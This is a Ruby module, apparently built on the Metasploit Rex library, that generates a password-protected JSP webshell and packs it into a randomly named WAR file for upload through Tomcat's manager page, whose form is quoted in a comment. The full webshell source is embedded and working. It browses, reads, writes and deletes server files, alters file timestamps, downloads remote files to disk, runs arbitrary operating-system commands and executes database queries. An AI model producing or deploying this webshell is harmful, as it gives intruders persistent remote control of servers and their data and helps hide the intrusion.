require 'rex/zip'
require 'rex/text'

require 'active_support/core_ext/hash' #blank?

module WebshellPayload

  def self.generate_jsp_webshell(password)
    %Q{
    <%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
<%!
String Pwd="#{password}";String EC(String s,String c)throws Exception{return s;}Connection GC(String s)throws Exception{String[] x=s.trim().split("\r\n");Class.forName(x[0].trim()).newInstance();Connection c=DriverManager.getConnection(x[1].trim());if(x.length>2){c.setCatalog(x[2].trim());}return c;}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i<r.length;i++){sb.append(r[i].toString().substring(0,2));}}void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT, sQ,sF="";java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");for(int i=0;i<l.length;i++){dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?"R":"";sQ+=l[i].canWrite()?" W":"";if(l[i].isDirectory()){sb.append(l[i].getName()+"/\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n");}else{sF+=l[i].getName()+"\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n";}}sb.append(sF);}void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();for(int k=0;k<x.length;k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write(("->"+"|").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write(("|"+"<-").getBytes(),0,3);os.close();is.close();}void GG(String s, String d)throws Exception{String h="0123456789ABCDEF";int n;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0;i<d.length();i+=2){os.write((h.indexOf(d.charAt(i))<<4|h.indexOf(d.charAt(i+1))));}os.close();}void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();for(int j=0;j<z.length;j++){HH(s+"/"+z[j].getName(),d+"/"+z[j].getName());}}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s, String d)throws Exception{URL u=new URL(s);int n=0;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}void MM(InputStream is, StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null){sb.append(l+"\r\n");}}void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=s.indexOf("oracle")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();while(r.next()){sb.append(r.getString(1)+"\t");}r.close();c.close();}void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] t={"TABLE"};ResultSet r=c.getMetaData().getTables (null,null,"%",t);while(r.next()){sb.append(r.getString("TABLE_NAME")+"\t");}r.close();c.close();}void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split("\r\n");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery("select * from "+x[3]);ResultSetMetaData d=r.getMetaData();for(int i=1;i<=d.getColumnCount();i++){sb.append(d.getColumnName(i)+" ("+d.getColumnTypeName(i)+")\t");}r.close();m.close();c.close();}void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception{Connection c = GC(s);Statement m = c.createStatement(1005, 1008);BufferedWriter bw = null;try {ResultSet r = m.executeQuery(q.indexOf("--f:")!=-1?q.substring(0,q.indexOf("--f:")):q);ResultSetMetaData d = r.getMetaData();int n = d.getColumnCount();for (int i = 1; i <= n; i++) {sb.append(d.getColumnName(i) + "\t|\t");}sb.append("\r\n");if(q.indexOf("--f:")!=-1){File file = new File(p);file.mkdirs();bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(p +q.substring(q.indexOf("--f:")+4,q.length()).trim()),true),cs));}while (r.next()){for(int i=1;i<=n;i++) {if(q.indexOf("--f:")!=-1){bw.write(EC(r.getString(i), cs)+"\t");bw.flush();}else{sb.append(EC(r.getString(i), cs) + "\t|\t");}}bw.newLine();sb.append("\r\n");}r.close();if(bw!=null){bw.close();}}catch (Exception e){sb.append("Result\t|\t\r\n");try{m.executeUpdate(q);sb.append("Execute Successfully!\t|\t\r\n");} catch (Exception ee){sb.append(ee.toString()+"\t|\t\r\n");}}m.close();c.close();}
 %><%
String cs=request.getParameter("z0")+"";request.setCharacterEncoding(cs);response.setContentType("text/html;charset="+cs);String Z=EC(request.getParameter(Pwd)+"",cs);String z1=EC(request.getParameter("z1")+"",cs);String z2=EC(request.getParameter("z2")+"",cs);StringBuffer sb=new StringBuffer("");try{sb.append("->"+"|");String s = request.getSession().getServletContext().getRealPath("/");if(Z.equals("A")){sb.append(s+"\t");if(!s.substring(0,1).equals("/")){AA(sb);}}else if(Z.equals("B")){BB(z1,sb);}else if(Z.equals("C")){String l="";BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null){sb.append(l+"\r\n");}br.close();}else if(Z.equals("D")){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append("1");}else if(Z.equals("E")){EE(z1);sb.append("1");}else if(Z.equals("F")){FF(z1,response);}else if(Z.equals("G")){GG(z1,z2);sb.append("1");}else if(Z.equals("H")){HH(z1,z2);sb.append("1");}else if(Z.equals("I")){II(z1,z2);sb.append("1");}else if(Z.equals("J")){JJ(z1);sb.append("1");}else if(Z.equals("K")){KK(z1,z2);sb.append("1");}else if(Z.equals("L")){LL(z1,z2);sb.append("1");}else if(Z.equals("M")){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals("N")){NN(z1,sb);}else if(Z.equals("O")){OO(z1,sb);}else if(Z.equals("P")){PP(z1,sb);}else if(Z.equals("Q")){QQ(cs, z1, z2,sb,s.replaceAll("\\\\","/")+"/images/");}}catch(Exception e){sb.append("ERROR"+":// "+e.toString());}sb.append("|"+"<-");out.print(sb.toString());
 %>}
  end

  def self.generate_war_webshell(password, opts={})
    jsp_raw = generate_jsp_webshell(password)

    jsp_name = opts[:jsp_name]
    jsp_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)
    app_name = opts[:app_name]
    app_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)

    meta_inf = [ 0xcafe, 0x0003 ].pack('Vv')
    manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
    web_xml = %q{<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
<servlet>
<servlet-name>NAME</servlet-name>
<jsp-file>/PAYLOAD.jsp</jsp-file>
</servlet>
</web-app>
}
    web_xml.gsub!(/NAME/, app_name)
    web_xml.gsub!(/PAYLOAD/, jsp_name)

    zip = Rex::Zip::Archive.new
    zip.add_file('META-INF/', '', meta_inf)
    zip.add_file('META-INF/MANIFEST.MF', manifest)
    zip.add_file('WEB-INF/', '')
    zip.add_file('WEB-INF/web.xml', web_xml)
    # add the payload
    zip.add_file("#{jsp_name}.jsp", jsp_raw)

    # add extra files
    if opts[:extra_files]
      opts[:extra_files].each { |el|
        zip.add_file(el[0], el[1])
      }
    end

    return zip.pack
  end

=begin
<form action="/manager/html/upload" method="post" enctype="multipart/form-data">
  <table cellpadding="3" cellspacing="0">
  <tbody><tr>
  <td class="row-right">
  <small>Select WAR file to upload</small>
 </td>
  <td class="row-left">
  <input name="deployWar" size="40" type="file">
  </td>
</tr>
  <tr>
  <td class="row-right">
  &nbsp;
  </td>
 <td class="row-left">
  <input value="Deploy" type="submit">
 </td>
  </tr>
</tbody></table>
</form>
=end
  def self.war_deploy(password)
    war_file = generate_war_webshell(password)
  end
end